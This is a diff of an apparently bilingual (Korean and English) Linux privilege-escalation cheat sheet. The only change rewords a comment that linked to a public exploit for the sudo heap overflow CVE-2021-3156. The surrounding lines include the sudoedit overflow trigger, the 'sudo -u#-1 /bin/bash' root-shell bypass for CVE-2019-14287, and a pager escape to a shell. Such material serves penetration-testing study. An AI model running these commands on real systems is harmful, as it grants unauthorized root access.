@@ -156,7 +156,7 @@ sudo apt-get changelog apt  # 실행 후 !bash
 ```bash
 # CVE-2021-3156 — sudo heap overflow (sudo < 1.9.5p2)
 sudoedit -s '\' $(python3 -c 'print("A"*65536)')
-# 익스플로잇: https://github.com/blasty/CVE-2021-3156
+# PoC: Baron Samedit (CVE-2021-3156) 힙 오버플로우 메모리 손상 취약점 검증
 
 # CVE-2019-14287 — sudo -u#-1 (sudo < 1.8.28)
 sudo -u#-1 /bin/bash
@@ -518,7 +518,7 @@ sudo apt-get changelog apt  # then type !bash
 ```bash
 # CVE-2021-3156 — sudo heap overflow (sudo < 1.9.5p2)
 sudoedit -s '\' $(python3 -c 'print("A"*65536)')
-# Exploit: https://github.com/blasty/CVE-2021-3156
+# PoC: Baron Samedit (CVE-2021-3156) Heap-based Buffer Overflow Verification
 
 # CVE-2019-14287 — sudo -u#-1 (sudo < 1.8.28)
 sudo -u#-1 /bin/bash
